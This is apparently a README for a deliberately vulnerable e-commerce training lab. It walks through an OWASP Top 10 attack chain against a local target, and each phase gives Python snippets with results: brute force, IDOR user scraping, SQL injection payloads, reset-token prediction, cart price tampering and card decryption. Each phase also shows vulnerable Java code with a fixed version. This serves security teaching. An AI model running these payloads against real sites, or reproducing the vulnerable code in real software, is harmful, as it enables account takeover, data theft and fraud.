# 🎯 OWASP Top 10 購物網站完整攻擊鏈

## 攻擊情境概述

本攻擊鏈模擬一個真實的滲透測試場景，攻擊者如何利用多個 OWASP Top 10 漏洞，從零開始入侵一個購物網站，最終達成：

- ✅ 取得管理員帳號密碼
- ✅ 竊取所有使用者資料
- ✅ 預測密碼重設 Token
- ✅ 竄改購物車免費購物
- ✅ 解密信用卡資訊

```
┌─────────────────────────────────────────────────────────────────┐
│                        攻擊流程圖                                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                   │
│   Phase 1          Phase 2           Phase 3          Phase 4    │
│  ┌────────┐      ┌─────────┐       ┌────────┐       ┌────────┐  │
│  │  偵察   │ ──▶ │暴力破解  │ ──▶  │  IDOR  │ ──▶  │  SQL   │  │
│  │ Recon  │      │  A07    │       │  A01   │       │  A03   │  │
│  └────────┘      └─────────┘       └────────┘       └────────┘  │
│       │                                                    │      │
│       ▼                                                    ▼      │
│   Phase 5          Phase 6           Bonus                       │
│  ┌────────┐      ┌─────────┐       ┌────────┐                   │
│  │ Token  │ ──▶ │購物車竄改│ ──▶  │信用卡解密│                   │
│  │ 預測   │      │  A08    │       │  A02   │                   │
│  │  A02   │      └─────────┘       └────────┘                   │
│  └────────┘                                                      │
│                                                                   │
└─────────────────────────────────────────────────────────────────┘
```

---

## 🔧 使用方式

```bash
# 進入腳本目錄
cd scripts/scenario

# 安裝依賴
pip install requests

# 執行完整攻擊鏈
python3 full_attack_chain.py --all

# 互動模式 (每個階段暫停)
python3 full_attack_chain.py --all --interactive

# 執行特定階段
python3 full_attack_chain.py --phase brute-force
python3 full_attack_chain.py --phase sql-injection
python3 full_attack_chain.py --phase token-prediction
```

---

## Phase 1: 偵察 (Reconnaissance)

### 目標
在攻擊前收集目標資訊，發現可利用的端點和使用者。

### 攻擊手法

#### 1.1 Actuator 端點掃描
```bash
# 測試 Spring Boot Actuator 端點
curl http://localhost:8081/api/actuator/env
curl http://localhost:8081/api/actuator/health
```

**風險**：Actuator 端點可能洩漏敏感配置資訊。

#### 1.2 使用者枚舉
```python
# 透過登入錯誤訊息判斷使用者是否存在
for username in ["admin", "john", "jane", "user"]:
    resp = requests.post("/api/auth/login", 
                         json={"username": username, "password": "wrong"})
    if resp.status_code == 401:
        print(f"使用者存在: {username}")
```

**漏洞**：系統對存在/不存在的使用者返回不同錯誤訊息。

### 發現結果
- 確認使用者：`admin`, `user`, `alice`, `bob`
- 後端技術：Spring Boot

---

## Phase 2: 暴力破解 (A07 - Authentication Failures)

### OWASP 分類
**A07:2021 – Identification and Authentication Failures**

### 攻擊手法
使用常見密碼字典對目標帳號進行暴力破解。

```python
COMMON_PASSWORDS = [
    "123456", "password", "123456789", "12345678", "12345",
    "1234567", "1234567890", "qwerty", "abc123", "password1",
    "111111", "admin123", "letmein", "welcome", "monkey",
    ...
]

for password in COMMON_PASSWORDS:
    resp = requests.post("/api/auth/login",
                         json={"username": "admin", "password": password})
    if resp.status_code == 200:
        print(f"密碼破解成功: {password}")
        break
```

### 攻擊結果
```
嘗試 1: admin:123456 ❌
嘗試 2: admin:password ❌
...
嘗試 12: admin:admin123 ✅

密碼破解成功！admin:admin123
JWT Token: eyJhbGciOiJIUzI1NiJ9...
```

### 漏洞原因
1. ❌ 無登入失敗次數限制
2. ❌ 無帳號鎖定機制
3. ❌ 使用弱密碼 `admin123`
4. ❌ 無 CAPTCHA 驗證

### 修復建議
```java
// 安全版本：加入速率限制
@RateLimiter(name = "loginLimiter", fallbackMethod = "loginFallback")
public ResponseEntity<?> login(@RequestBody LoginRequest request) {
    // 登入邏輯
}

// 密碼強度驗證
@Pattern(regexp = "^(?=.*[a-z])(?=.*[A-Z])(?=.*\\d)(?=.*[@$!%*?&]).{12,}$")
private String password;
```

---

## Phase 3: IDOR 攻擊 (A01 - Broken Access Control)

### OWASP 分類
**A01:2021 – Broken Access Control**

### 攻擊手法
使用取得的 Token，遍歷使用者 ID 來存取其他使用者資料。

```python
headers = {"Authorization": f"Bearer {token}"}

for user_id in range(1, 100):
    resp = requests.get(f"/api/users/{user_id}", headers=headers)
    if resp.status_code == 200:
        user_data = resp.json()
        print(f"竊取資料: {user_data}")
```

### 攻擊結果
```
使用者 1: admin (ADMIN!) - admin@example.com
使用者 2: user (USER) - user@example.com
使用者 3: alice (USER) - alice@example.com
使用者 4: bob (USER) - bob@example.com

IDOR 攻擊完成！取得 4 個使用者資料
```

### 漏洞原因
```java
// ⚠️ 漏洞版本：無權限檢查
@GetMapping("/users/{id}")
public User getUser(@PathVariable Long id) {
    return userRepository.findById(id).orElseThrow();
}
```

### 修復建議
```java
// ✅ 安全版本：檢查資源所有權
@GetMapping("/users/{id}")
@PreAuthorize("hasRole('ADMIN') or #id == authentication.principal.id")
public User getUser(@PathVariable Long id, Authentication auth) {
    User currentUser = (User) auth.getPrincipal();
    if (!currentUser.getId().equals(id) && !currentUser.isAdmin()) {
        throw new AccessDeniedException("無權存取");
    }
    return userRepository.findById(id).orElseThrow();
}
```

---

## Phase 4: SQL Injection (A03 - Injection)

### OWASP 分類
**A03:2021 – Injection**

### 攻擊手法
在搜尋功能中注入 SQL 語句，繞過查詢條件。

```python
payloads = [
    "' OR '1'='1",           # 萬能密碼
    "%' OR 1=1 OR '%'='",    # LIKE 注入
    "' UNION SELECT 1,2,3--" # UNION 注入
]

for payload in payloads:
    resp = requests.get(f"/api/products/search?keyword={payload}")
    print(f"返回 {len(resp.json())} 筆資料")
```

### 攻擊結果
```
萬能密碼: 注入成功！返回 10 筆資料
LIKE 注入: 注入成功！返回 10 筆資料

SQL Injection 測試完成！發現 2 個漏洞端點
```

### 漏洞原因
```java
// ⚠️ 漏洞版本：字串拼接
@Query("SELECT p FROM Product p WHERE p.name LIKE '%" + keyword + "%'")
List<Product> searchProducts(String keyword);
```

### 修復建議
```java
// ✅ 安全版本：參數化查詢
@Query("SELECT p FROM Product p WHERE p.name LIKE %:keyword%")
List<Product> searchProducts(@Param("keyword") String keyword);
```

---

## Phase 5: Token 預測攻擊 (A02 - Cryptographic Failures)

### OWASP 分類
**A02:2021 – Cryptographic Failures**

### 攻擊手法
分析密碼重設 Token 的生成演算法，預測任意使用者的 Token。

```python
import hashlib

# 從原始碼分析得知演算法
secret = "fixed-secret-2024"
target_user = "admin"

# 計算預測的 Token
data = f"{target_user}{secret}"
predicted_token = hashlib.md5(data.encode()).hexdigest()

print(f"預測的 Token: {predicted_token}")
# 結果: ce7b622036f81c6f6a073e055924d7e5
```

### 攻擊結果
```
目標帳號: admin
使用演算法: MD5(username + "fixed-secret-2024")

預測的重設 Token: ce7b622036f81c6f6a073e055924d7e5
重設連結: /auth/reset-password?token=ce7b622036f81c6f6a073e055924d7e5

⚠️ 攻擊者可直接重設 admin 的密碼！
```

### 漏洞原因
```java
// ⚠️ 漏洞版本：可預測的 Token
public String generateResetToken(String username) {
    String secret = "fixed-secret-2024";  // 硬編碼密鑰
    return DigestUtils.md5Hex(username + secret);  // 弱雜湊
}
```

### 修復建議
```java
// ✅ 安全版本：隨機 Token
public String generateResetToken(String username) {
    byte[] randomBytes = new byte[32];
    new SecureRandom().nextBytes(randomBytes);
    return Base64.getUrlEncoder().encodeToString(randomBytes);
}
```

---

## Phase 6: 購物車竄改 (A08 - Data Integrity Failures)

### OWASP 分類
**A08:2021 – Software and Data Integrity Failures**

### 攻擊手法
直接修改購物車中的商品價格，讓伺服器接受竄改的資料。

```python
# 竄改購物車資料
tampered_cart = {
    "items": [
        {"productId": 1, "name": "iPhone 15 Pro", "price": 0.01, "quantity": 1},
        {"productId": 2, "name": "MacBook Pro", "price": 0.01, "quantity": 1}
    ]
}

resp = requests.post("/api/cart/update", 
                     headers=headers, 
                     json=tampered_cart)
```

### 攻擊結果
```
原始購物車總計: NT$ 95,800
竄改後總計: NT$ 0.02

成功節省: NT$ 95,799.98
訂單建立成功！
訂單編號: ORD-2024-12345
實付金額: NT$ 0.02

🛒 免費購物攻擊成功！
```

### 漏洞原因
```java
// ⚠️ 漏洞版本：信任客戶端價格
@PostMapping("/cart/update")
public Cart updateCart(@RequestBody CartRequest request) {
    // 直接使用客戶端傳來的價格
    cart.setItems(request.getItems());
    return cart;
}
```

### 修復建議
```java
// ✅ 安全版本：伺服器端驗證價格
@PostMapping("/cart/update")
public Cart updateCart(@RequestBody CartRequest request) {
    for (CartItem item : request.getItems()) {
        // 從資料庫取得真實價格
        Product product = productRepository.findById(item.getProductId());
        item.setPrice(product.getPrice());
    }
    return cart;
}
```

---

## Bonus: 信用卡解密 (A02 - Cryptographic Failures)

### 攻擊手法
利用洩漏的加密金鑰，解密儲存的信用卡資訊。

```python
# 從原始碼洩漏的金鑰
key = "MySecret"

# 加密的信用卡
encrypted_card = "VB0CRTOPAiPb7/7F3xeSev65WbfUZC/L"

# 呼叫解密 API
resp = requests.post("/api/crypto/decrypt",
                     json={"encryptedData": encrypted_card, "key": key})

# 結果: 4111-1111-1111-1111
```

### 漏洞原因
1. ❌ 使用弱加密演算法 (DES)
2. ❌ 硬編碼加密金鑰
3. ❌ 金鑰儲存在原始碼中
4. ❌ 提供解密 API

### 修復建議
```java
// ✅ 安全版本
// 1. 使用 AES-256-GCM
// 2. 金鑰儲存在 HSM 或密鑰管理服務
// 3. 不提供解密 API
// 4. 僅儲存信用卡後四碼用於顯示
```

---

## 🎯 攻擊成果總結

| 階段 | 弱點 | 成果 |
|------|------|------|
| Phase 1 | 資訊洩漏 | 發現 4 個使用者 |
| Phase 2 | A07 認證失敗 | 破解 admin:admin123 |
| Phase 3 | A01 權限控制 | 竊取 4 筆使用者資料 |
| Phase 4 | A03 注入攻擊 | 發現 2 個 SQLi 端點 |
| Phase 5 | A02 密碼學失敗 | 預測密碼重設 Token |
| Phase 6 | A08 完整性失敗 | 免費購物成功 |
| Bonus | A02 密碼學失敗 | 解密信用卡資訊 |

---

## 🛡️ 防禦總結

| 弱點 | 漏洞版本 | 安全版本 |
|------|---------|---------|
| A01 | 無權限檢查 | `@PreAuthorize` + 資源所有權驗證 |
| A02 | DES + 硬編碼金鑰 | AES-256 + HSM 金鑰管理 |
| A03 | 字串拼接 SQL | 參數化查詢 / JPA Repository |
| A07 | 無登入限制 | 速率限制 + 帳號鎖定 + 強密碼 |
| A08 | 信任客戶端資料 | 伺服器端驗證所有關鍵資料 |

---

## ⚠️ 免責聲明

本攻擊鏈腳本僅供教育和授權滲透測試使用。

**請勿用於：**
- 未經授權的系統
- 生產環境
- 任何非法用途

**使用本工具即表示您同意：**
- 僅在自己的測試環境中使用
- 遵守所有適用的法律法規
- 對使用本工具的後果負全責
